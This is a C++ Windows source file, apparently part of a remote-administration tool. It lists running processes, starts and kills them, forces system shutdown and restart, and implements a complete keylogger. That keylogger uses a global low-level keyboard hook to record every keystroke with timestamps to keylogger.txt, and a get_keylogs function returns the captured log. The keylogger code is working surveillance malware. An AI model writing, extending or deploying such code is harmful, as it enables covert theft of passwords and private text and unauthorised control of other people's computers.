// Define necessary macros before including headers
#define UNICODE
#define _UNICODE
#define _WIN32_WINNT 0x0601
#define WINVER 0x0601

#include "ProcessManager.hpp"

#undef max // Undefine potential max macro from Windows headers

#include <tlhelp32.h>
#include <processthreadsapi.h> // For GetCurrentThreadId
#include <handleapi.h>
#include <sstream>
#include <vector>
#include <stdexcept>
#include <locale>
#include <codecvt>
#include <winuser.h> // For SetWindowsHookEx, CallNextHookEx, UnhookWindowsHookEx, GetMessage, TranslateMessage, DispatchMessage, PostThreadMessage, WM_QUIT, GetKeyState, ToUnicode
#include <string.h>
#include <algorithm> // For std::transform (if used, though removed from name comparison now)
#include <cctype>    // For ::tolower
#include <cwchar>    // For _wcslwr_s, wcsncpy_s, wcscmp, wcslen
#include <winbase.h>
#include <securitybaseapi.h>
#include <errhandlingapi.h>
#include <winnt.h> // For SHTDN_REASON flags
#include <fstream> // For file operations
#include <chrono>  // For timestamps
#include <ctime>   // For timestamps
#include <iomanip> // For put_time
#include <iostream> // For std::cerr


// --- BEGIN: Direct definitions for potentially missing constants ---
#ifndef SHTDN_REASON_FLAG_MAJOR_OTHER
#define SHTDN_REASON_FLAG_MAJOR_OTHER 0x00000300
#endif

#ifndef SHTDN_REASON_FLAG_MINOR_OTHER
#define SHTDN_REASON_FLAG_MINOR_OTHER 0x00000000
#endif
// --- END: Direct definitions ---

// --- Keylogger Global Variables Definition (Moved to the top) ---
std::atomic_bool g_keylogger_running(false);
std::thread g_keylogger_thread;
HHOOK g_keyboard_hook = NULL;
std::mutex g_log_mutex; // Mutex for file access (in this version)
DWORD g_keylogger_thread_id = 0; // Thread ID for PostThreadMessage
const std::string KEYLOG_FILE_RELATIVE_PATH = "keylogger.txt"; // Default log file name


static BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);

    if (pid != 0) {
        EnumWindowsCallbackData* data = reinterpret_cast<EnumWindowsCallbackData*>(lParam);
        if (IsWindowVisible(hwnd) && GetWindowTextLengthW(hwnd) > 0) {
            data->pids_with_windows->insert(pid);
        }
    }
    return TRUE;
}

std::unordered_set<DWORD> get_pids_with_visible_windows() {
    std::unordered_set<DWORD> pids;
    EnumWindowsCallbackData data;
    data.pids_with_windows = &pids;

    EnumWindows(EnumWindowsCallback, reinterpret_cast<LPARAM>(&data));
    return pids;
}

bool EnableShutdownPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}


std::string list_apps_windows() {
    std::stringstream ss;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    std::unordered_set<DWORD> pids_with_windows = get_pids_with_visible_windows();

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        ss << "ERROR: Could not create process snapshot (" << GetLastError() << ").";
        return ss.str();
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        ss << "ERROR: Could not retrieve process information (" << GetLastError() << ").";
        return ss.str();
    }

    do {
        if (pids_with_windows.count(pe32.th32ProcessID)) {
            std::string processName;
            int required_size = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, NULL, 0, NULL, NULL);

            if (required_size > 0) {
                processName.resize(required_size - 1);
                WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, processName.data(), required_size, NULL, NULL);
            }

            ss << "PID: " << pe32.th32ProcessID << " - " << processName << "\n";
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return ss.str();
}

std::string list_background_processes_windows() {
    std::stringstream ss;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    std::unordered_set<DWORD> pids_with_windows = get_pids_with_visible_windows();

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        ss << "ERROR: Could not create process snapshot (" << GetLastError() << ").";
        return ss.str();
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        ss << "ERROR: Could not retrieve process information (" << GetLastError() << ").";
        return ss.str();
    }

    do {
        if (pids_with_windows.find(pe32.th32ProcessID) == pids_with_windows.end()) {
            std::string processName;
            int required_size = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, NULL, 0, NULL, NULL);

            if (required_size > 0) {
                processName.resize(required_size - 1);
                WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, processName.data(), required_size, NULL, NULL);
            }

            ss << "PID: " << pe32.th32ProcessID << " - " << processName << "\n";
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return ss.str();
}

std::string start_new_process_windows(const std::string& command_line) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    int wideCharLen = MultiByteToWideChar(CP_UTF8, 0, command_line.c_str(), (int)command_line.length(), NULL, 0);
    if (wideCharLen == 0 && command_line.length() > 0) {
         return "ERROR: Failed to calculate required buffer size for command line (" + std::to_string(GetLastError()) + ").";
    }

    std::vector<wchar_t> wideCmdLineBuf(wideCharLen + 1);
    wideCmdLineBuf.back() = L'\0';

    int result = MultiByteToWideChar(CP_UTF8, 0, command_line.c_str(), (int)command_line.length(), wideCmdLineBuf.data(), wideCharLen);
     if (result == 0 && command_line.length() > 0) {
         return "ERROR: Failed to convert command line to wide characters (" + std::to_string(GetLastError()) + ").";
     }

    if (!CreateProcess(
        NULL,
        wideCmdLineBuf.data(),
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi)
    )
    {
        return "ERROR: Failed to start process '" + command_line + "' (" + std::to_string(GetLastError()) + ").";
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return "SUCCESS: Process '" + command_line + "' started. PID: " + std::to_string(pi.dwProcessId);
}

std::string terminate_process_by_pid_windows(DWORD process_id) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, process_id);

    if (hProcess == NULL) {
         if (GetLastError() == ERROR_INVALID_PARAMETER) {
             return "ERROR: Invalid Process ID " + std::to_string(process_id) + ".";
         }
        return "ERROR: Could not open process " + std::to_string(process_id) + " (" + std::to_string(GetLastError()) + ").";
    }

    if (!TerminateProcess(hProcess, 0)) {
        CloseHandle(hProcess);
        return "ERROR: Could not terminate process " + std::to_string(process_id) + " (" + std::to_string(GetLastError()) + ").";
    }

    CloseHandle(hProcess);
    return "SUCCESS: Process " + std::to_string(process_id) + " terminated.";
}

std::string terminate_process_by_name_windows(const std::string& process_name) {
    std::stringstream ss;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    bool found = false;
    int terminated_count = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        ss << "ERROR: Could not create process snapshot (" << GetLastError() << ").";
        return ss.str();
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        ss << "ERROR: Could not retrieve process information (" << GetLastError() << ").";
        return ss.str();
    }

    std::wstring target_name_lower_w;
    if (!process_name.empty()) {
        int target_name_lower_w_size = MultiByteToWideChar(CP_UTF8, 0, process_name.c_str(), (int)process_name.length(), NULL, 0);
         if (target_name_lower_w_size > 0) {
            target_name_lower_w.resize(target_name_lower_w_size);
            MultiByteToWideChar(CP_UTF8, 0, process_name.c_str(), (int)process_name.length(), target_name_lower_w.data(), target_name_lower_w_size);
            std::vector<wchar_t> target_name_lower_buf(target_name_lower_w_size + 1);
            wcsncpy_s(target_name_lower_buf.data(), target_name_lower_buf.size(), target_name_lower_w.c_str(), target_name_lower_w_size);
            _wcslwr_s(target_name_lower_buf.data(), target_name_lower_buf.size());
            target_name_lower_w = target_name_lower_buf.data();
        }
    }


    do {
        wchar_t* current_process_name_w_arr = pe32.szExeFile;
        std::wstring current_process_name_lower_w = current_process_name_w_arr;
        if (!current_process_name_lower_w.empty()) {
            std::vector<wchar_t> current_process_name_lower_buf(current_process_name_lower_w.length() + 1);
            wcsncpy_s(current_process_name_lower_buf.data(), current_process_name_lower_buf.size(), current_process_name_lower_w.c_str(), current_process_name_lower_w.length());
            _wcslwr_s(current_process_name_lower_buf.data(), current_process_name_lower_buf.size());
            current_process_name_lower_w = current_process_name_lower_buf.data();
        }

        if (!target_name_lower_w.empty() && current_process_name_lower_w == target_name_lower_w) {
            found = true;
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                if (TerminateProcess(hProcess, 0)) {
                     std::string current_process_name_utf8;
                     int required_size_out = WideCharToMultiByte(CP_UTF8, 0, current_process_name_w_arr, -1, NULL, 0, NULL, NULL);
                     if (required_size_out > 0) {
                         current_process_name_utf8.resize(required_size_out - 1);
                         WideCharToMultiByte(CP_UTF8, 0, current_process_name_w_arr, -1, current_process_name_utf8.data(), required_size_out, NULL, NULL);
                     } else {
                         current_process_name_utf8 = "Unknown Process Name";
                     }
                    ss << "SUCCESS: Process '" << current_process_name_utf8 << "' (PID: " << pe32.th32ProcessID << ") terminated.\n";
                    terminated_count++;
                } else {
                     std::string current_process_name_utf8;
                     int required_size_out = WideCharToMultiByte(CP_UTF8, 0, current_process_name_w_arr, -1, NULL, 0, NULL, NULL);
                     if (required_size_out > 0) {
                         current_process_name_utf8.resize(required_size_out - 1);
                         WideCharToMultiByte(CP_UTF8, 0, current_process_name_w_arr, -1, current_process_name_utf8.data(), required_size_out, NULL, NULL);
                     } else {
                          current_process_name_utf8 = "Unknown Process Name";
                     }
                     ss << "ERROR: Could not terminate process '" << current_process_name_utf8 << "' (PID: " << pe32.th32ProcessID << ") (" << GetLastError() << ").\n";
                }
                CloseHandle(hProcess);
            } else {
                 std::string current_process_name_utf8;
                 int required_size_out = WideCharToMultiByte(CP_UTF8, 0, current_process_name_w_arr, -1, NULL, 0, NULL, NULL);
                 if (required_size_out > 0) {
                     current_process_name_utf8.resize(required_size_out - 1);
                     WideCharToMultiByte(CP_UTF8, 0, current_process_name_w_arr, -1, current_process_name_utf8.data(), required_size_out, NULL, NULL);
                 } else {
                      current_process_name_utf8 = "Unknown Process Name";
                 }
                 ss << "ERROR: Could not open process '" << current_process_name_utf8 << "' (PID: " << pe32.th32ProcessID << ") (" + std::to_string(GetLastError()) + ").\n";
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    if (!found) {
        ss << "INFO: No process found with the name '" << process_name << "'.\n";
    } else if (terminated_count > 0) {
         // Success messages already in ss
    } else {
         // All found processes failed to terminate, error messages already in ss
    }

    return ss.str();
}

std::string shutdown_windows_system() {
    if (!EnableShutdownPrivilege()) {
        return "ERROR: Could not enable shutdown privilege (" + std::to_string(GetLastError()) + ").";
    }

    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCEIFHUNG, SHTDN_REASON_FLAG_MAJOR_OTHER | SHTDN_REASON_FLAG_MINOR_OTHER)) {
        return "ERROR: Failed to shut down the system (" + std::to_string(GetLastError()) + ").";
    }

    return "SUCCESS: System is shutting down.";
}

std::string restart_windows_system() {
     if (!EnableShutdownPrivilege()) {
        return "ERROR: Could not enable shutdown privilege (" + std::to_string(GetLastError()) + ").";
    }

    if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, SHTDN_REASON_FLAG_MAJOR_OTHER | SHTDN_REASON_FLAG_MINOR_OTHER)) {
        return "ERROR: Failed to restart the system (" + std::to_string(GetLastError()) + ").";
    }

    return "SUCCESS: System is restarting.";
}

// --- Keylogger Implementations ---

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::lock_guard<std::mutex> guard(g_log_mutex); // Protect file access
            // In this version, we write directly to the file per key press
            std::ofstream logfile(KEYLOG_FILE_RELATIVE_PATH, std::ios::app); // Open for appending

            if (logfile.is_open()) {
                auto now = std::chrono::system_clock::now();
                auto in_time_t = std::chrono::system_clock::to_time_t(now);

                struct tm tm_buf;
                localtime_s(&tm_buf, &in_time_t);

                bool shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000);
                bool ctrl_pressed = (GetKeyState(VK_CONTROL) & 0x8000);
                bool alt_pressed = (GetKeyState(VK_MENU) & 0x8000);

                logfile << "[" << std::put_time(&tm_buf, "%Y-%m-%d %H:%M:%S") << "] ";

                // Get key name or character - simplified conversion
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);

                wchar_t buffer[16];
                int result = ToUnicode(p->vkCode, p->scanCode, keyboard_state, buffer, 16, 0);

                if (result > 0) {
                     std::string char_utf8;
                     int required_size = WideCharToMultiByte(CP_UTF8, 0, buffer, result, NULL, 0, NULL, NULL);
                     if (required_size > 0) {
                        char_utf8.resize(required_size);
                        WideCharToMultiByte(CP_UTF8, 0, buffer, result, char_utf8.data(), required_size, NULL, NULL);

                        // Handle common control/special characters
                        if (p->vkCode == VK_RETURN) { logfile << "[ENTER]"; }
                        else if (p->vkCode == VK_TAB) { logfile << "[TAB]"; }
                        else if (p->vkCode == VK_BACK) { logfile << "[BACKSPACE]"; }
                        else if (p->vkCode == VK_DELETE) { logfile << "[DELETE]"; } // Added DELETE here too
                        else if (p->vkCode == VK_ESCAPE) { logfile << "[ESC]"; }
                        else if (p->vkCode == VK_LEFT) { logfile << "[LEFT]"; }
                        else if (p->vkCode == VK_RIGHT) { logfile << "[RIGHT]"; }
                        else if (p->vkCode == VK_UP) { logfile << "[UP]"; }
                        else if (p->vkCode == VK_DOWN) { logfile << "[DOWN]"; }
                        else if (p->vkCode == VK_END) { logfile << "[END]"; }
                        else if (p->vkCode == VK_HOME) { logfile << "[HOME]"; }
                        else if (p->vkCode == VK_PRIOR) { logfile << "[PAGE UP]"; }
                        else if (p->vkCode == VK_NEXT) { logfile << "[PAGE DOWN]"; }
                         else if (p->vkCode >= VK_F1 && p->vkCode <= VK_F24) { logfile << "[F" << (p->vkCode - VK_F1 + 1) << "]"; }
                         else if (p->vkCode == VK_SPACE) { logfile << "[SPACE]"; }
                         else if (p->vkCode == VK_OEM_PERIOD) { logfile << "."; }
                         else if (p->vkCode == VK_OEM_COMMA) { logfile << ","; }
                         else if (p->vkCode == VK_OEM_PLUS) { logfile << (shift_pressed ? "+" : "="); } // Example with shift
                        // Handle other specific keys as needed

                        // Check if it's a printable character
                        else if (char_utf8.length() >= 1 && (unsigned char)char_utf8[0] >= 32) {
                             logfile << char_utf8;
                        }
                        else { // Fallback for other control/non-printable chars that ToUnicode might map
                             logfile << "[VK:" << p->vkCode << "]";
                        }

                     } else {
                         logfile << "[VK:" << p->vkCode << "]"; // Fallback if conversion fails
                     }
                } else {
                     // ToUnicode returned 0 or -1 (dead key or no translation)
                     // Handle common special keys that ToUnicode might not translate
                     if (p->vkCode == VK_SHIFT || p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) { /* Handled by GetKeyState */ }
                     else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL) { /* Handled by GetKeyState */ }
                     else if (p->vkCode == VK_MENU || p->vkCode == VK_LMENU || p->vkCode == VK_RMENU) { /* Handled by GetKeyState */ }
                     else if (p->vkCode == VK_CAPITAL) { logfile << "[CAPS LOCK]"; } // Note: State changes are events
                     else if (p->vkCode == VK_NUMLOCK) { logfile << "[NUM LOCK]"; }
                     else if (p->vkCode == VK_SCROLL) { logfile << "[SCROLL LOCK]"; }
                     else if (p->vkCode == VK_PAUSE) { logfile << "[PAUSE]"; }
                     else if (p->vkCode == VK_INSERT) { logfile << "[INSERT]"; }
                     else if (p->vkCode == VK_SNAPSHOT) { logfile << "[PRINT SCREEN]"; }
                     else if (p->vkCode == VK_DELETE) { logfile << "[DELETE]"; } // Added DELETE here too


                     else { logfile << "[VK:" << p->vkCode << "]"; }
                }


                // Add newline after each key event
                logfile << "\n";


                logfile.close();
            } else {
                 std::cerr << "Keylogger Error: Could not open log file for writing." << std::endl;
            }
        }
    }
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

void KeyloggerThreadFunction() {
    g_keylogger_thread_id = GetCurrentThreadId();

    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0); // hMod should be NULL for LL hooks

    if (g_keyboard_hook == NULL) {
        std::cerr << "Keylogger Error: Could not set hook (" << GetLastError() << ")" << std::endl;
        g_keylogger_running.store(false);
        g_keylogger_thread_id = 0; // Reset ID on failure
        return;
    }

    MSG msg;
    // Message loop required for hooks
    // Loop continues as long as GetMessage returns > 0 (not WM_QUIT)
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        // In this version, the thread exits when g_keylogger_running is false
        // and a message causes GetMessage to return. PostThreadMessage(WM_QUIT)
        // is the intended way to unblock GetMessage gracefully.
        if (!g_keylogger_running.load()) {
             // We rely on WM_QUIT to break GetMessage loop. This check might be redundant
             // or cause slight delay in exiting after WM_QUIT is posted but before it's processed.
             // For a robust loop break using flag, you'd use PeekMessage.
             // However, GetMessage is required for hooks. WM_QUIT is standard.
        }
    }

    // Unhook when the loop terminates (due to WM_QUIT)
    if (g_keyboard_hook != NULL) {
        UnhookWindowsHookEx(g_keyboard_hook);
        g_keyboard_hook = NULL;
    }
    g_keylogger_thread_id = 0; // Reset ID after thread exits
    std::cerr << "Keylogger: Thread shutting down." << std::endl;

    // NO file writing happens here in this version
}

std::string start_keylogger() {
    if (g_keylogger_running.load()) {
        return "INFO: Keylogger is already running.";
    }

    // In this version, we might want to clear the log file on start
    {
        std::lock_guard<std::mutex> guard(g_log_mutex); // Protect file access
        std::ofstream logfile(KEYLOG_FILE_RELATIVE_PATH, std::ios::trunc); // Open for writing, truncate existing
         if (logfile.is_open()) {
             logfile.close();
             std::cerr << "Keylogger: Log file " << KEYLOG_FILE_RELATIVE_PATH << " cleared on start." << std::endl;
         } else {
             std::cerr << "Keylogger Warning: Could not open log file to clear on start (" << KEYLOG_FILE_RELATIVE_PATH << "). Error: " << GetLastError() << std::endl;
         }
    }


    g_keylogger_running.store(true);
    try {
        if (g_keylogger_thread.joinable()) {
            g_keylogger_thread.join();
        }
        g_keylogger_thread = std::thread(KeyloggerThreadFunction);
        return "SUCCESS: Keylogger started. Logging to file " + KEYLOG_FILE_RELATIVE_PATH + ".";
    } catch (const std::system_error& e) {
         g_keylogger_running.store(false);
         g_keylogger_thread_id = 0;
         std::stringstream ss;
         ss << "ERROR: Failed to create keylogger thread (" << e.what() << ").";
         return ss.str();
    } catch (const std::exception& e) {
        g_keylogger_running.store(false);
        g_keylogger_thread_id = 0;
        std::stringstream ss;
        ss << "ERROR: Failed to create keylogger thread (Unknown exception: " << e.what() << ").";
        return ss.str();
    }
}

std::string stop_keylogger() {
    if (!g_keylogger_running.load()) {
        return "INFO: Keylogger is not running.";
    }

    // Signal the thread to stop by posting WM_QUIT message
    if (g_keylogger_thread_id != 0) {
        PostThreadMessage(g_keylogger_thread_id, WM_QUIT, 0, 0);
         std::cerr << "Keylogger: Posted WM_QUIT message to thread ID " << g_keylogger_thread_id << ". Waiting for thread to finish." << std::endl;
    } else {
         // Fallback: attempt unhooking directly and setting flag
         if (g_keyboard_hook != NULL) {
             UnhookWindowsHookEx(g_keyboard_hook);
             g_keyboard_hook = NULL;
             std::cerr << "Keylogger: Thread ID not available, attempted UnhookWindowsHookEx from main." << std::endl;
         } else {
             std::cerr << "Keylogger: Thread ID not available and hook is null. Cannot signal thread to stop." << std::endl;
         }
    }

    g_keylogger_running.store(false); // Set flag to false (redundant if WM_QUIT works, but safe)


    if (g_keylogger_thread.joinable()) {
        try {
            g_keylogger_thread.join(); // Wait for the thread to finish
             std::cerr << "Keylogger: Thread joined successfully." << std::endl;
        } catch (const std::system_error& e) {
             std::stringstream ss;
             ss << "ERROR: Failed to join keylogger thread (" << e.what() << ").";
             return ss.str();
        }
    } else {
        std::cerr << "Keylogger: Thread was not joinable." << std::endl;
         return "WARNING: Keylogger thread was not joinable.";
    }

    return "SUCCESS: Keylogger stopped."; // No log writing happens here in this version
}

// This version still has get_keylogs to read the file
std::string get_keylogs(const std::string& log_file_path) {
    std::lock_guard<std::mutex> guard(g_log_mutex); // Protect file access
    std::ifstream logfile(log_file_path);
    std::stringstream ss;

    if (!logfile.is_open()) {
        ss << "ERROR: Could not open log file '" << log_file_path << "'. Error: " << GetLastError();
        return ss.str();
    }

    ss << logfile.rdbuf();
    logfile.close();

    return ss.str();
}


